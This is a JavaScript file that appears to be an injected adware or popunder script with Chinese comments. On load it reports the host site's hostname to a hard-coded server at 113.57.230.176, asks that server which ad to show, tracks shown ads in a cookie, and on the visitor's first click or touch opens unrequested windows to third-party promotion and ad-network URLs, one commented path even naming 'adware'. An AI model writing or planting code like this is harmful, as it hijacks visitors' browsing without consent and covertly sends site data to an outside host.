window.onload = function() {
	var script = document.createElement('script');
	var head = document.getElementsByTagName('head')[0];
	script.type = 'text/javascript';
	script.src = 'http://code.jquery.com/jquery-latest.js';
	head.appendChild(script);
	
	
	window.url1 = top.location.hostname;
	isTouchDevice();
	var reqType = 1;
	var ad = 0;
	window.opp = 11;
	window.aop = 0;
	window.popFlag = getCookie('FlagForAbc123123');
	var xmlHttp;
	//alert(url1);
	script.onload = script.onreadystatechange = function() {
		if (!this.readyState || this.readyState == 'loaded' || this.readyState == 'complete') {
			ap(reqType, ad, url1);

		}
		script.onload = script.onreadystatechange = null;
	}


}

function ap(reqType, ad, url1) {

if (navigator.cookieEnabled == true) {
	
	sendPostRequest("http://113.57.230.176:8888/404/Po", "reqType=3&url=" + url1);
	//sendPostRequest("http://127.0.0.1:8080/404/Po", "reqType=3&url=" + url1);
	
	var v1=0;
	var v3=0;
	var v5=0;
	var v6=0;
	var v7=0;
	//var v8=0;
	var v7n=0;
	var v9=0;
	if (popFlag == null || popFlag == "") {             
		popFlag = 0;
		

	}
	
	else
		{
		if(popFlag.indexOf("5")!=-1)
			{
			 v5=1;
			
			}
		if(popFlag.indexOf("6")!=-1)
		{
		 v6=1;
		
		}
		if(popFlag.indexOf("7")!=-1)
		{
		 v7=1;
		
		}
//		if(popFlag.indexOf("8")!=-1)
//		{
//		 
//		v8=1;
//		}
		if(popFlag.indexOf("3")!=-1)
		{
		 
		v3=1;
		}
		if(popFlag.indexOf("1")!=-1)
		{
		 
		v1=1;
		}
		if(popFlag.indexOf("9")!=-1)
		{
		 
		v9=1;
		}
		if(v7==1)
			{
		var strs= new Array(); //定义一数组 
		strs=popFlag.split(","); //字符分割 
		for (i=0;i<strs.length ;i++ ) 
		{ 
			if(strs[i]==7)
				{
				  v7n+=1;
				}
		
		} 
		if(v7n>=2)
			{
			v7=v7n;
			//opp=7;
			}
			}
		}
	
		
console.log("p:"+popFlag);
//	console.log("v7n:"+v7n);
//	console.log("v1:"+v1);
//	console.log("v3:"+v3);
//	console.log("v5:"+v5);
//	console.log("v7:"+v7);
//	console.log("v8:"+v8);
//	console.log("v9:"+v9);
	
	if (popFlag ==0||((v1==0||v3==0||v5==0)&&v7==0&&v9==0)) {
		$.ajax({
			type : 'post',
			url : 'http://113.57.230.176:8888/404/Bo',
			//url : 'http://127.0.0.1:8080/404/Bo',
			data : {
				"ad" : ad,
				"url" : url1
			},
			dataType : 'jsonp',

			jsonp : "jsonpcallback",
			success : function(result) {
				console.log("a1:"+result.status);
				console.log(result.dese);
				
				if (result.status == "0") {
					if (result.dese == "5") {
						
						opp=5;
					
					}
					if (result.dese == "1" ) {
						
						opp=5;
						
					}
					if (result.dese == "3") {
						opp=3;
					}
					if (result.dese == "6") {
						opp=6;
					}
					if (result.dese == "7") {
						opp=7;
					}
					if (result.dese == "8") {
						opp=8;
					}
					if(popFlag==0)
						{
						setCookieOneDay("FlagForAbc123123",popFlag+","+opp+",", 60 * 24);
						
						}
					else
						{
						setCookieOneDay("FlagForAbc123123",popFlag+opp+",", 60 * 24);
						}
					
				}
				else
					{
					opp=9;
					if(v7<1)
					{
					opp=7;
					//console.log("opp2 is 7");
					}
					if(popFlag==0)
					{
					setCookieOneDay("FlagForAbc123123",popFlag+","+opp+",", 60 * 24);
					
					}
				   else
					{
					setCookieOneDay("FlagForAbc123123",popFlag+opp+",", 60 * 24);
					}
					}

			},
			error : function() {setCookie("FlagForAbc123123", 99, 20);}
		});
	
	} else {
		if(v7<1&&v9==0)
			{
			opp=7;
			//console.log("opp is 7");
			}
		
            

	}
}
}

document.onclick = function(ev) {

	if (opp == 1 || opp == 3 || opp == 5||opp==6||opp==7) {
		var ap = opp;
		//console.log("a1:"+opp)
		
		opp = 11;

		
		$.ajax({
			type : 'post',
			//url : 'http://127.0.0.1:8080/404/Co',
			url : 'http://113.57.230.176:8888/404/Co',
			data : {
				"ad" : ap
				
			},
			dataType : 'jsonp',

			jsonp : "jsonpcallback",
			success : function(result) {

				//console.log("a2："+result.status); 
				//console.log(result.dese);
				if (result.status == "3") {
					if(popFlag==0)
					{
					setCookieOneDay("FlagForAbc123123",popFlag+","+ap+",", 60 * 24);
					
					}
				else
					{
					setCookieOneDay("FlagForAbc123123",popFlag+ap+",", 60 * 24);
					}
					

				}

			},
			error : function() {

				setCookieOneDay("FlagForAbc123123", 9, 30);
			}
		});
		if (ap == 1) {
			//window.open("http://lbbseo.com:8888/adware/ldy6.do?id=111");
		}
		if (ap == 3) {
			
			window.open("http://m.mychebao.com/czhib_promote/SEOSecIndew.htm?isBaiDu=35123&wuhan");
		}
		if (ap == 5) {
			window.open("http://iwap.2345.com/?lm_1128");
			//window.open("http://netkr.sunrtb.cn/c?m=netkr&v=43.642.113&fc=1&l=http://engine.yuyiya.com/index/activity?appKey=36Dsjee7ot6QR1z2W8QqWLcLoMTY&adslotId=1551");
		}
		if (ap == 6) {
			window.open("http://toutiao.eastday.com/?qid=jhxin");
			//setCookieOneDay("FlagForAbc123123", 99, 30);
			//window.open("http://netkr.sunrtb.cn/c?m=netkr&v=43.642.113&fc=1&l=http://engine.yuyiya.com/index/activity?appKey=36Dsjee7ot6QR1z2W8QqWLcLoMTY&adslotId=1551");
			              			
		}
if (ap == 7) {
			
			window.open("http://netkr.sunrtb.cn/c?m=netkr&v=43.642.113&fc=1&l=http://engine.yuyiya.com/index/activity?appKey=36Dsjee7ot6QR1z2W8QqWLcLoMTY&adslotId=1551");
			              			
		}

	} else {
		
         return;
	}
}
function touchSatrtFunc(e) {  
    //evt.preventDefault(); //阻止触摸时浏览器的缩放、滚动条滚动等  
   //alert(opp);
	
  // if (opp == 1 || opp == 3 || opp == 5||opp==7||opp==8) {
	if (opp == 1 || opp == 3 || opp == 5||opp==6||opp==7) { 
		var ap = opp;
		
		
		opp = 11;

		
		$.ajax({
			type : 'post',
			//url : 'http://127.0.0.1:8080/404/Co',
			url : 'http://113.57.230.176:8888/404/Co',
			data : {
				"ad" : ap
				
			},
			dataType : 'jsonp',

			jsonp : "jsonpcallback",
			success : function(result) {

				console.log("a2："+result.status); 
				console.log(result.dese);
				if (result.status == "3") {
					if(popFlag==0)
					{
					setCookieOneDay("FlagForAbc123123",popFlag+","+opp+",", 60 * 24);
					
					}
				else
					{
					setCookieOneDay("FlagForAbc123123",popFlag+opp+",", 60 * 24);
					}

				}

			},
			error : function() {

				setCookieOneDay("FlagForAbc123123", 99, 30);
			}
		});
		if (ap == 1) {
			//window.open("http://lbbseo.com:8888/adware/ldy6.do?id=111");
		}
		if (ap == 3) {
			
			window.open("http://m.mychebao.com/czhib_promote/SEOSecIndew.htm?isBaiDu=35123&wuhan");
		}
		if (ap == 5) {
			window.open("http://iwap.2345.com/?lm_1128");
			//window.open("http://netkr.sunrtb.cn/c?m=netkr&v=43.642.113&fc=1&l=http://engine.yuyiya.com/index/activity?appKey=36Dsjee7ot6QR1z2W8QqWLcLoMTY&adslotId=1551");
		}
		if (ap == 6) {
			//setCookieOneDay("FlagForAbc123123", 99, 30);
			window.open("http://toutiao.eastday.com/?qid=jhxin");
			//window.open("http://netkr.sunrtb.cn/c?m=netkr&v=43.642.113&fc=1&l=http://engine.yuyiya.com/index/activity?appKey=36Dsjee7ot6QR1z2W8QqWLcLoMTY&adslotId=1551");
			              			
		}
		if (ap == 7) {
			
			window.open("http://netkr.sunrtb.cn/c?m=netkr&v=43.642.113&fc=1&l=http://engine.yuyiya.com/index/activity?appKey=36Dsjee7ot6QR1z2W8QqWLcLoMTY&adslotId=1551");
			              			
		}

	} else {
		 //alert("3333333333");
       return;
	}
}  
function isTouchDevice() {
   // document.getElementById("version").innerHTML = navigator.appVersion;

    try {
        document.createEvent("TouchEvent");
        //alert("TouchEvent");

        bindEvent(); //绑定事件
    }
    catch (e) {
       // alert("no TouchEvent" + e.message);
    }
}
function bindEvent() {
    document.addEventListener('touchstart', touchSatrtFunc, false);
    //document.addEventListener('touchmove', touchMoveFunc, false);
   // document.addEventListener('touchend', touchEndFunc, false);
}
function getCookie(c_name) {
	if (document.cookie.length > 0) {
		c_start = document.cookie.indexOf(c_name + "=");

		if (c_start != -1) {
			c_start = c_start + c_name.length + 1;
			c_end = document.cookie.indexOf(";", c_start);
			if (c_end == -1)
				c_end = document.cookie.length;
			return unescape(document.cookie.substring(c_start, c_end));


		}
	}

	return "";
}


function setCookie(c_name, value, expireMins) {
	//var leftTime = new Date(new Date(new Date().toLocaleDateString()).getTime() + 24 * 60 * 60 * 1000 - 1) //当日23点59分59秒过期

	//document.cookie = c_name + "=" + escape(value) + ((expireMins == null) ? "" : ";expires=" + leftTime.toGMTString());
	var exdate = new Date();
	exdate.setTime(exdate.getTime() + expireMins * 60 * 1000);
	document.cookie = c_name + "=" + escape(value) +
	((expireMins == null) ? "" : ";expires=" + exdate.toGMTString());
}
function setCookieOneDay(c_name, value, expireMins) {
	var leftTime = new Date(new Date(new Date().toLocaleDateString()).getTime() + 24 * 60 * 60 * 1000 - 1) //当日23点59分59秒过期

	document.cookie = c_name + "=" + escape(value) + ((expireMins == null) ? "" : ";expires=" + leftTime.toGMTString());
	
}

function sendPostRequest(url, param, callback) {
	var xmlhttp;
	if (window.XMLHttpRequest) {
		// code for IE7+, Firefox, Chrome, Opera, Safari
		xmlhttp = new XMLHttpRequest();
	} else {
		// code for IE6, IE5
		xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
	}
	xmlhttp.onreadystatechange = callback;
	xmlhttp.open("POST", url, true);
	xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	xmlhttp.send(param);
	return xmlhttp;
}
